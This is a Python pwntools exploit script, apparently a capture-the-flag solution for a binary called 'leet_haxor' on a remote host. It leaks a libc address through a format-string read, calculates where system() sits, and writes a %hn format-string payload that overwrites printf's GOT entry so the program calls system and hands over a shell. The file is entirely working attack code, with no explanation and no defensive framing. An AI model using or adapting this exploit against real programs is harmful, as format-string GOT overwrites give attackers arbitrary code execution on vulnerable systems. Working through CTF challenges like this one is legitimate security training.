from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './leet_haxor'
HOST = 'jh2i.com'
PORT = 50022

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


r = start()
if args.D:
    debug(r, [])

# leak
r.sendlineafter('exit\n', '0')
r.sendlineafter('chrs):\n', '%33$p')
leak = int(r.recvuntil('\n')[:-1], 16)
dbg('leak')
'''
offset___libc_start_main_ret = 0x21b97
offset_system = 0x000000000004f440
offset_dup2 = 0x00000000001109a0
offset_read = 0x0000000000110070
offset_write = 0x0000000000110140
offset_str_bin_sh = 0x1b3e9a
'''
base = leak - 0x21b97
system = base + 0x4f440
dbg('base')
dbg('system')


r.sendlineafter('exit\n', '0')
# base off: 18
target = elf.got.printf
value = system
payload = ''

offset = 0
for i in range(3): 
    c = ((value >> (i*8*2)) - offset) % 0x10000
    if c == 0:
        c = 0x10000
    payload += '%' + str(c) + 'c%' + str(18+i+6) + '$hn'
    offset += c
payload = payload.ljust(0x30, 'A')

for i in range(3):
    payload += p64(target + i*2)

log.info(len(payload))
r.sendlineafter('chrs):\n', payload)


r.interactive()
r.close()
